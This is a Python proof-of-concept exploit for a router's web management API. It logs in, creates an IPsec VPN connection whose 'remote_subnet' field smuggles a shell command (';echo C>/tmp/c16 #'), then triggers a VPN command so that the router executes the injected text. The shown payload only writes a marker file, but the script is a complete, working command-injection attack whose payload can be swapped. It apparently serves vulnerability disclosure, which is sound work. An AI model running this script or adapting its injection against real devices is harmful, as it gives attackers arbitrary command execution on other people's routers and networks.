import hashlib
import json
import time

import requests


# You need to modify the router password first.
BASE = "http://192.168.1.1"
PASSWORD = "Tzz123456"

# Choose an unused ipsec_connection_N section.
# The trigger index must match this section number.
IPSEC_NAME = "ipsec_connection_2"
IPSEC_INDEX = 2

# The remote_subnet field is small. Keep the payload short.
# This benign payload creates /tmp/c16 with the content "C".
PAYLOAD = ";echo C>/tmp/c16 #"


def post(session, path, data):
    url = BASE + path
    headers = {
        "Host": "192.168.1.1",
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/json; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": BASE,
        "Referer": BASE + "/",
    }
    response = session.post(url, headers=headers, json=data, timeout=10)
    print(response.text)
    return response.json()


def login(session):
    info = post(
        session,
        "/",
        {"method": "do", "user_management": {"get_encrypt_info": None}},
    )
    nonce = info.get("data", {}).get("nonce") or info.get("nonce")
    password_hash = hashlib.md5(f"{PASSWORD}:{nonce}".encode()).hexdigest()
    result = post(
        session,
        "/",
        {"method": "do", "login": {"password": password_hash, "encrypt_type": "3"}},
    )
    stok = result.get("stok") or result.get("data", {}).get("stok")
    if not stok:
        raise RuntimeError("login failed")
    return stok


def add_ipsec_connection(session, stok):
    data = {
        "method": "add",
        "vpn": {
            "table": "ipsec_connection",
            "name": IPSEC_NAME,
            "para": {
                "name": "cmd16_poc",
                "enable": "off",
                "bindif": "WAN1",
                "remote_peer": "1.1.1.1",
                "local_subnet": "192.168.0.0/24",
                "remote_subnet": PAYLOAD,
                "psk": "cmd16poc123",
                "exchange_mode": "main",
                "connection_type": "initiator",
                "local_id_type": "IP_ADDRESS",
                "remote_id_type": "IP_ADDRESS",
                "ike_proposal_1": "3des-md5-modp1024",
                "ph2_proposal_1": "esp-3des-md5",
                "ike_protocol": "ikev1",
                "pfs": "modp1024",
                "dpd_enable": "off",
                "dpd_interval": "0",
                "ike_lifetime": "28800",
                "sa_lifetime": "28800",
            },
        },
    }
    return post(session, f"/stok={stok}/ds", data)


def trigger_vpn_success(session, stok):
    data = {
        "method": "do",
        "system": {
            "command": {
                "cmd": f"vpn --ipsec_succee {IPSEC_INDEX}",
            }
        },
    }
    return post(session, f"/stok={stok}/ds", data)


def main():
    if len(PAYLOAD) > 19:
        raise RuntimeError("payload is too long for remote_subnet")

    session = requests.Session()
    stok = login(session)
    add_ipsec_connection(session, stok)
    trigger_vpn_success(session, stok)
    time.sleep(1)

    print("Check the router shell:")
    print("cat /tmp/c16")
    print("rm -f /tmp/c16")


if __name__ == "__main__":
    main()